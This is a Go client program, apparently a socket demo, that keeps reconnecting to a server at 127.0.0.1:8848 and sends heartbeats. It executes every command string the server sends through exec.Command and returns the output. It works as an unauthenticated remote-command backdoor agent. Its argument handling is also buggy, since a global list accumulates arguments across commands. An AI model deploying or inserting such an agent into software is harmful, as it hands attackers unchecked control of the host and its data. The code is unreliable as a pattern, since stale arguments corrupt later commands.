package main

import (
    "fmt"
    "os"
    "net"
    "strconv"
    "time"
    "github.com/MXi4oyu/MoonSocket/protocol"
    "errors"
    "os/exec"
    "golang.org/x/text/transform"
    "bytes"
    "golang.org/x/text/encoding/simplifiedchinese"
    "io/ioutil"
    "strings"
)

var (
    arglist []string
)

//定义CheckError方法，避免写太多到 if err!=nil
func CheckError(err error)  {
    if err!=nil{
        fmt.Fprintf(os.Stderr,"发生错误:%s",err.Error())
        os.Exit(1)
    }

}

//解决断线重连问题
func doWork(conn net.Conn) error {
    ch:=make(chan int,100)
    ticker := time.NewTicker(time.Second)
    defer ticker.Stop()
    for{
        select {
        case stat:=<-ch:
            if stat==2{
                return errors.New("None Msg")
            }
        case <-ticker.C:
            ch<-1
            go ClientMsgHandler(conn,ch)
        case <-time.After(time.Second*10):
            defer conn.Close()
            fmt.Println("超时断线....")
        }
    }
    return nil
}

func main()  {
    //动态传入服务端IP和端口号
    service:="127.0.0.1:8848"
    tcpAddr,err:=net.ResolveTCPAddr("tcp4",service)
    CheckError(err)
    for{
        conn,err:=net.DialTCP("tcp",nil,tcpAddr)
        if err!=nil{
            fmt.Fprintf(os.Stderr,"未连接服务端:%s \n",err.Error())
        }else{
            fmt.Printf("连接服务端:%s \n",conn.RemoteAddr().String())
            defer conn.Close()
            doWork(conn)
        }
        time.Sleep(3 * time.Second)
    }

}

//客户端消息处理
func ClientMsgHandler(conn net.Conn,ch chan int)  {
    <-ch
    //获取当前时间
    msg:="❤❤❤❤❤❤"
    go SendMsg(conn,msg)
    go ReadMsg(conn,ch)

}

// 获取时间
func GetSession() string{
    gs1:=time.Now().Unix()
    gs2:=strconv.FormatInt(gs1,10)
    return gs2
}

//接收服务端发来的消息
func ReadMsg(conn net.Conn,ch chan int)  {
    //存储被截断的数据
    tmpbuf:=make([] byte,0)
    buf:=make([] byte,1024)

    //将信息解包
    n,_:=conn.Read(buf)
    tmpbuf = protocol.Depack(append(tmpbuf,buf[:n]...))
    msg:=string(tmpbuf)
    fmt.Println("收到服务端发生的数据:",msg)
    if len(msg)==0{
        //服务端无返回信息
        ch<-2
    } else if msg != "cmd" {
        context := strings.Fields(msg)
        doCmd(conn,context)
    }
}

func doCmd(conn net.Conn,cmd []string){
    if cmd[0] != "" {
       switch cmd[0] {
       case "gettime":
           respondMsg := GetSession()
           SendMsg(conn,respondMsg)
       default:
           result,err := command(cmd)
           fmt.Println(result)
           if err != nil{
               SendMsg(conn,"运行出错！")
           }else {
               SendMsg(conn,result)
           }
       }
    }
}

func command(cmd []string) (string,error){
    for _,v := range cmd[1:] {
        arglist=append(arglist,v)
    }
    fmt.Println("======",arglist)
    result, err := exec.Command(cmd[0],arglist...).Output()
    if err != nil {
        fmt.Println("命令出错:", err.Error())
    }
    utf8,_:=GbkToUtf8(result)
    return string(utf8),err

}

//UTF-8 与 GBK 编码转换,防止中文乱码
func GbkToUtf8(s []byte) ([]byte, error) {
    reader := transform.NewReader(bytes.NewReader(s), simplifiedchinese.GBK.NewDecoder())
    d, e := ioutil.ReadAll(reader)
    if e != nil {
        return nil, e
    }
    return d, nil
}

//向服务端发送消息
func SendMsg(conn net.Conn,msg string)  {
    //将信息封包
    smsg:=protocol.Enpack([]byte(msg))
    conn.Write(smsg)

}